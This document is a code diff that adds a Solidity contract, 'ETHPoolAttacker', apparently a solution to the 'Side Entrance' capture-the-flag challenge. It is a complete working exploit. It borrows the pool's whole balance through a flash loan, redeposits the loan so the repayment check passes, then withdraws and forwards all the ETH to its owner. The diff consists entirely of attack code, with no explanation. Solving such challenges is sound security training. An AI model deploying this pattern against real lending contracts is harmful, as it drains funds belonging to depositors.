@@ -35,4 +35,35 @@ contract SideEntranceLenderPool {
         require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
     }
 }
+
+contract ETHPoolAttacker{
+
+    address public owner ;
+    constructor(){
+        owner = msg.sender ;
+    }
+
+    SideEntranceLenderPool pool;
+    function attack(address _pool) payable public{
+        pool = SideEntranceLenderPool(_pool) ;
+        uint balance = address(_pool).balance;
+        pool.flashLoan(balance);
+    }
+
+    function execute() payable public {
+        require(msg.sender == address(pool),"only pool can call this function");
+        pool.deposit{value : address(this).balance }();
+    }
+
+    // final step to take all ETH from the lending pool.
+    function withdraw() public {
+        pool.withdraw();
+    }
+
+    receive () external payable {
+        (bool sent ,)=owner.call{value : msg.value}("");
+        require(sent,"failed to send ETH to owner.");
+    }
+
+}
  
